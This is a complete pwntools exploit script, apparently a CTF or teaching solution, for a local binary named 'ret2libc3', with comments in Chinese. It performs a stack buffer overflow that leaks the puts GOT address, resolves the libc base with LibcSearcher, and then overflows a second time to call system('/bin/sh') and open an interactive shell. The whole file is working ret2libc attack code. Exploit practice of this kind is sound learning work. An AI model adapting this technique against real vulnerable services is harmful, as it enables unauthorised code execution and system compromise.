from pwn import *
from LibcSearcher import *
 
elf = ELF('./ret2libc3')
sh = process('./ret2libc3')

# 获取puts的plt
# 获取puts的got
# 获取程序开始点地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start_addr = elf.symbols['_start']

# 第一次溢出攻击
# 泄露地址
payload1 = flat([
    (0x6c + 4) * b'A',
    puts_plt,
    start_addr,
    puts_got
])
sh.sendlineafter('Can you find it !?', payload1)
leaked_addr = u32(sh.recv(4))

# 根据libc版本查询地址, 选择libc6-i386_2.37-6_amd64
libc = LibcSearcher('puts', leaked_addr)
# 计算基址
libc_base = leaked_addr - libc.dump("puts")
# 计算system函数和字符串地址
system_addr = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")
# 需要额外压入_init_proc函数的返回地址
return_addr = 0x804841E
# 第二次溢出攻击
payload2 = flat([
    (0x6c + 4) * b'A',
    return_addr,
    system_addr,
    4 * b'B',
    bin_sh
])
sh.sendlineafter('Can you find it !?',payload2)
sh.interactive()